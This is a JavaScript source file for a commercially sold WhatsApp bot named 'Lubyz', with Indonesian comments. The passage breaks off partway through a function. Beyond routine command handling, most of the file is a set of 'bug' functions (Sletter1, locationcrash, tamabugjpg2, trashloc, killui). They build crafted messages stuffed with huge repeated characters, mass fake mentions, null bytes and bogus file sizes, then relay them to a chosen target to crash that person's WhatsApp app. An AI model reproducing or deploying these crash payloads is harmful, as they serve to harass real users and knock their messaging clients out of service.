/*
#LUBYZ
BUY NO ENC +6282189474878
*/
// ADA BEBERAPA FUNC YANG GAK KEPAKEK, KALIAN HAPUS SENDIRI AJA
module.exports = async (lubyz, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const crypto = require('crypto')
const makeid = crypto.randomBytes(3).toString('hex')
const { Client } = require('ssh2');
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await lubyz.decodeJid(lubyz.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = m.sender == botNumber
const groupMetadata = isGroup ? await lubyz.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : undefined
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : undefined
const isBotAdmin = participant_bot?.admin !== null && participant_bot?.admin !== undefined ? true : false
const isAdmin = participant_sender?.admin !== null && participant_sender?.admin !== undefined ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const { Scraper } = require("akiraa-wb");
const Skrep = new Scraper()
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const plerr = JSON.parse(fs.readFileSync('./all/database/idgrup2.json').toString())
const jangan2 = m.isGroup ? plerr.includes(m.chat) : false
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
// TAMBAHAN

// CONST PREMIUM
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const kontributor = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
// CEK DATABASE
const isPremium = prem.includes(m.sender)
const { BingImageCreator } = require("./all/bingimg.js");
//=================================//
     // CONST DEV & INFO BOT
const paket = 'VIP'
const pengembang = 'LUBYZ'
const bot = 'Lubyz'
const verup = '16.0.0'


global.mess = {
"done": 'Bug Suksess Terkirim\n> Cek Target Auto C1!',
"sendbug": 'Bug Sedang Diproses\n> Tunggu Selama 1Menit!'
}
 //===============================//
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return lubyz.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "application/zip", fileName: "Dokumen Negara.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await lubyz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/lcg8b5.jpg'
}

async function lubyzReply(teks) {
return lubyz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "Powered By Lubyz", previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363374529648284@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By Lubyz`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6281572074859:+62 815-7207-4859\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qloc = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'Developer Lubyz',
                    "jpegThumbnail": ''
                          }
                        }
                      }


let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

lubyz.autoshalat = lubyz.autoshalat ? lubyz.autoshalat : {}
    let ats = m.chat
    if (ats in lubyz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:03',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '11:39',
    ashar: '15:03',
    magrib: '17:52',
    isya: '19:05',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        lubyz.autoshalat[ats] = [
            lubyz.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mpeg',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./all/shalat.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete lubyz.autoshalat[m.chat]
            }, 57000)
        ]
    }
  }
async function reply(teks) {
            lubyz.sendMessage(m.chat, { 
                text: teks,
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        isForwarded: true,
                        containsAutoReply: true,
                        title: `𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫`,
                        body: ``,
                        previewType: "VIDEO",
                        thumbnailUrl: "https://files.catbox.moe/lcg8b5.jpg",
                        thumbnail: ``,
                        sourceUrl: `https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U`
                    }
                }
            }, { quoted: m });
        };
    
 //==========   
  
    
//==================================//
    
        // FUNC BUG LUBYZ
const qdocu = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
					"mimetype": "application/octet-stream",
					"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
					"fileLength": "64455",
					"pageCount": 1,
					"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
					"fileName": "⩟⬦𪲁 𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 -" + "ꦾ".repeat(90000),
					"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
				}
			}
		}
async function Sletter1(target) {
let virtex = "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫" + "ꦾ".repeat(50000);
let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );
	var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363321780343299@newsletter`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: mentionedJidArray,
                  groupMentions: [{ groupJid: "120363321780343299@newsletter", groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': target
			});
			await lubyz.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': messageContent.key.id
		});
		console.log(chalk.red.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
}
    
   
 //==================================\\          // FUNC BUG LUBYZ

async function locationcrash(target, wanted) {

var etc = generateWAMessageFromContent(target, proto.Message.fromObject({

viewOnceMessage: {

message: {

  "liveLocationMessage": {

    "degreesLatitude": "p",

    "degreesLongitude": "p",

    "caption": `*\`҈𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫.Com᭢\`*`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: wanted })

await lubyz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
    console.log(chalk.yellow.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
}
    
  //===============================\\ 
        // FUNC BUG LUBYZ
async function tamabugjpg2(target, QBug) {
      var etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: "⩟⬦𪲁 𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 -" + "ꦾ".repeat(90000),
            fileSha256: "1DZhdaBhAo3f2HuDq4XhDgxgp24GXhVJ3rJrnTJqk00=",
            fileLength: "85631",
            height: 80000,
            width: 80000,
            mediaKey: "4m0noHF4XWMqfQw+jdP2IxKjmY9BbaCS+fo0inRyX80=",
            fileEncSha256: "hd+s3yufaLrlpxnxvWwCEJRTCpFcbrzu5EEgf+QzFW0=",
            directPath:
              "/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1730971373",
            jpegThumbnail:
              "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",
            scansSidecar:
              "Sl6CM3K+yVZIMVPndmuHRGwdunpzPpsNeCSXWMY0a3s5d/Swhvc3rQ==",
            scanLengths: [9877, 27074, 16754, 31926],
            midQualityFileSha256:
              "vkK/C7Cj6CIkjZWGCg/pZ6x0pyBY0zSqPN7MymCYtOU=",
          },
        }),
        { userJid: target, quoted: QBug }
      );
      await lubyz.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id,
      });
      console.log(chalk.green.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
    }
    
  //===============================//  
          // FUNC BUG LUBYZ
   async function trashloc(target) {
      let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: " 𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ",
                degreesLongitude: " I love You - Lubyz ",
                caption: "Lubyz V1.5" + "\u0000" + "ꦾ".repeat(90000),
                sequenceNumber: "0",
                jpegThumbnail: "",
              },
            },
          },
        }),
        { userJid: target, quoted: qchanel }
      );

      await lubyz.relayMessage(target, etc.message, {
        participant: { jid: target },
      });
      console.log(chalk.blue.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
    }
    
    
    
    //==========≠==================//
           // FUNC BUG LUBYZ
async function killui(X, ThM, Ptcp = true) {
      await lubyz.relayMessage(
        X,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "Assalamu'alaikum",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫\n" + "ꦾ".repeat(200000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6283846077142@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Pembantai Ripper",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
